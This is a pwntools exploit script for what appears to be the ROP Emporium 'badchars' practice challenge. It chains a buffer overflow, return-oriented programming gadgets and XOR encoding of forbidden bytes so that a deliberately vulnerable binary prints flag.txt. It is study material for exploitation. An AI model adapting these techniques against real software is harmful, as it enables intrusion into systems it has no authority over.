#!/usr/bin/env python3
import os
from pwn import *
from pwn_ext import *

exe = ELF("badchars_patched")

context.binary = exe
# GDB Compatability stuff
if "alacritty" in os.environ["TERM"]:
    context.terminal = ["alacritty", "-e"]
elif "tmux" in os.environ["TERM"]:
    context.terminal = ["tmux", "splitw", "-h"]
elif os.environ["GNOME_TERMINAL_SCREEN"]:
    context.terminal = ["gnome-terminal", "--"]

# Who needs more than one process?
if args.REMOTE:
    #p = remote("addr", 1337)
    p = nc_remote("") # just put entire nc command or host:port here
elif args.CLEAN:
    p = process([exe.path])
else:
    gdbscript = '''
    set sysroot /
    b*main
    c
    '''
    p = gdb.debug([exe.path], gdbscript=gdbscript)

### PUT ACTUAL PWN STUFF BELOW THIS LINE ###

# Helper function to replace badchars in a payload
# Maybe replacing all chars is easier? we cannot control the granularity of XOR in assembly that well?
def badchar_helper(badchars, payload):
    encoded_string = payload
    counter = 0
    while any(char in str(encoded_string) for char in badchars):
        counter = counter + 1
        encoded_string = bytes([b ^ counter for b in payload])
        print(encoded_string)
    print("XOR value:", hex(counter))
    print(encoded_string)
    return encoded_string, counter


def main():
    # good luck pwning :)
    print_file = p64(0x0000000000400510)
    # Find writeable memory location. In gbd use vmmap and info files to find suitable location.
    dot_data = p64(0x0000000000601038)
    # Not packed because of concat error
    bss = 0x601038

    offset = b"A"*40
    nop = 0x90
    junk = p64(0x4343434343434343)
    # can be used for stack alignment
    ret = p64(0x4004ee)
    # XOR is reversible, therefore we use xor on the badchars in our payload
    # and find an xor gadget to reverse it when the payload is in memory?
    badchars = ['x', 'g', 'a', '.']
    encoded_payload, hex_value = badchar_helper(badchars=badchars, payload=b"flag.txt")

    # Gadgets: This time i used this neat feature of ROPgadget: ROPgadget --binary badchars --only "pop|ret"
    # xor byte ptr [r15], r14b; ret. r14b means the lowest byte of register 14
    xor = p64(0x400628)
    pop_r14_pop_r15 = p64(0x4006a0)
    pop_rdi = p64(0x4006a3)
    pop_r15 = p64(0x00000000004006a2)
    #Mov gadget chosen is qword as this can contain 8 bytes instead of 4.
    mov_qword_r13_r12 = p64(0x400634)
    pop_r12_r13_r14_r15 = p64(0x40069c)


    # Construct XOR chain
    xor_transform = b""
    for i in range(8):
        xor_transform += pop_r15
        xor_transform += p64(bss + i)
        xor_transform += xor

    rop_chain = (offset + 
                 ret +                # stack alignment
                 pop_r12_r13_r14_r15 + encoded_payload + p64(bss) + p64(hex_value) + junk + # prime for saving to .data and xor
                 mov_qword_r13_r12 + # Save to .data
                 xor_transform +      # XOR with hex_value to obtain original string (flag.txt)
                 pop_rdi + p64(bss) + # Load string into rdi
                 print_file           # Call function with print_file in rdi (1st argument to function)
                 )

    p.recvuntil(b">")
    p.sendline(rop_chain)

    p.interactive()

if __name__ == "__main__":
    main()
